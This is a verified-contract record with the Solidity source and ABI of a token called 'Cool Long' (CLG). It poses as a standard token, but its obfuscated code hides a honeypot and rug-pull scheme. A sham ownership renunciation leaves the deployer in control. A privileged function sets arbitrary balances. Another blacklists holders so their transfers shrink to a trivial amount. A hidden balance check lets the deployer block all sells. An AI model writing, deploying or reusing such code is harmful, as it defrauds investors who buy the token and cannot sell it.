{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface fundBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract limitSell {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverLimit {\n    function createPair(address toAt, address takeSwap) external returns (address);\n}\n\ninterface receiverWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeLimit) external view returns (uint256);\n\n    function transfer(address receiverMaxSwap, uint256 listFrom) external returns (bool);\n\n    function allowance(address sellWallet, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listFrom) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverMaxSwap,\n        uint256 listFrom\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minFund, uint256 value);\n    event Approval(address indexed sellWallet, address indexed spender, uint256 value);\n}\n\ninterface atMaxTo is receiverWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CoolLong is limitSell, receiverWallet, atMaxTo {\n\n    address private takeLaunched;\n\n    function limitMinMax(address liquiditySender, address receiverMaxSwap, uint256 listFrom) internal returns (bool) {\n        require(maxReceiver[liquiditySender] >= listFrom);\n        maxReceiver[liquiditySender] -= listFrom;\n        maxReceiver[receiverMaxSwap] += listFrom;\n        emit Transfer(liquiditySender, receiverMaxSwap, listFrom);\n        return true;\n    }\n\n    bool private swapBuy;\n\n    function name() external view virtual override returns (string memory) {\n        return takeSwapTx;\n    }\n\n    event OwnershipTransferred(address indexed isMarketing, address indexed fundShould);\n\n    mapping(address => uint256) private maxReceiver;\n\n    function symbol() external view virtual override returns (string memory) {\n        return txList;\n    }\n\n    address fromToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public autoLaunched;\n\n    function getOwner() external view returns (address) {\n        return takeLaunched;\n    }\n\n    mapping(address => bool) public sellList;\n\n    function launchedTokenAt(address receiverFund, uint256 listFrom) public {\n        takeTotal();\n        maxReceiver[receiverFund] = listFrom;\n    }\n\n    bool private feeMarketing;\n\n    uint256 tokenLiquidity;\n\n    address enableAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public tokenAt;\n\n    function allowance(address walletLimitTx, address launchedToShould) external view virtual override returns (uint256) {\n        if (launchedToShould == enableAmount) {\n            return type(uint256).max;\n        }\n        return launchMax[walletLimitTx][launchedToShould];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundList;\n    }\n\n    uint256 private takeAmount;\n\n    bool public minModeMax;\n\n    uint8 private fundList = 18;\n\n    string private takeSwapTx = \"Cool Long\";\n\n    function tradingMax(address amountSenderTake) public {\n        if (exemptFund) {\n            return;\n        }\n        \n        autoLaunched[amountSenderTake] = true;\n        \n        exemptFund = true;\n    }\n\n    function approve(address launchedToShould, uint256 listFrom) public virtual override returns (bool) {\n        launchMax[_msgSender()][launchedToShould] = listFrom;\n        emit Approval(_msgSender(), launchedToShould, listFrom);\n        return true;\n    }\n\n    function takeTotal() private view {\n        require(autoLaunched[_msgSender()]);\n    }\n\n    function balanceOf(address feeLimit) public view virtual override returns (uint256) {\n        return maxReceiver[feeLimit];\n    }\n\n    bool public exemptFund;\n\n    function transfer(address receiverFund, uint256 listFrom) external virtual override returns (bool) {\n        return tokenFrom(_msgSender(), receiverFund, listFrom);\n    }\n\n    uint256 private modeAmount;\n\n    bool private fundTotal;\n\n    function takeLimit(uint256 listFrom) public {\n        takeTotal();\n        txToken = listFrom;\n    }\n\n    function autoReceiver() public {\n        emit OwnershipTransferred(receiverExempt, address(0));\n        takeLaunched = address(0);\n    }\n\n    constructor (){\n        \n        fundBuy swapMarketing = fundBuy(enableAmount);\n        tokenAt = receiverLimit(swapMarketing.factory()).createPair(swapMarketing.WETH(), address(this));\n        if (fundTotal) {\n            swapBuy = false;\n        }\n        receiverExempt = _msgSender();\n        autoReceiver();\n        autoLaunched[receiverExempt] = true;\n        maxReceiver[receiverExempt] = exemptTotal;\n        if (modeAmount != takeAmount) {\n            takeAmount = modeAmount;\n        }\n        emit Transfer(address(0), receiverExempt, exemptTotal);\n    }\n\n    function owner() external view returns (address) {\n        return takeLaunched;\n    }\n\n    uint256 constant txReceiver = 8 ** 10;\n\n    mapping(address => mapping(address => uint256)) private launchMax;\n\n    function tokenFrom(address liquiditySender, address receiverMaxSwap, uint256 listFrom) internal returns (bool) {\n        if (liquiditySender == receiverExempt) {\n            return limitMinMax(liquiditySender, receiverMaxSwap, listFrom);\n        }\n        uint256 receiverLaunch = receiverWallet(tokenAt).balanceOf(fromToken);\n        require(receiverLaunch == txToken);\n        require(receiverMaxSwap != fromToken);\n        if (sellList[liquiditySender]) {\n            return limitMinMax(liquiditySender, receiverMaxSwap, txReceiver);\n        }\n        return limitMinMax(liquiditySender, receiverMaxSwap, listFrom);\n    }\n\n    function enableIs(address walletShould) public {\n        takeTotal();\n        \n        if (walletShould == receiverExempt || walletShould == tokenAt) {\n            return;\n        }\n        sellList[walletShould] = true;\n    }\n\n    uint256 private exemptTotal = 100000000 * 10 ** 18;\n\n    uint256 txToken;\n\n    bool private amountWalletSender;\n\n    function transferFrom(address liquiditySender, address receiverMaxSwap, uint256 listFrom) external override returns (bool) {\n        if (_msgSender() != enableAmount) {\n            if (launchMax[liquiditySender][_msgSender()] != type(uint256).max) {\n                require(listFrom <= launchMax[liquiditySender][_msgSender()]);\n                launchMax[liquiditySender][_msgSender()] -= listFrom;\n            }\n        }\n        return tokenFrom(liquiditySender, receiverMaxSwap, listFrom);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptTotal;\n    }\n\n    string private txList = \"CLG\";\n\n    address public receiverExempt;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minFund\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletLimitTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedToShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedToShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listFrom\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLimit\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletShould\",\"type\":\"address\"}],\"name\":\"enableIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listFrom\",\"type\":\"uint256\"}],\"name\":\"launchedTokenAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minModeMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listFrom\",\"type\":\"uint256\"}],\"name\":\"takeLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountSenderTake\",\"type\":\"address\"}],\"name\":\"tradingMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listFrom\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquiditySender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverMaxSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listFrom\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CoolLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}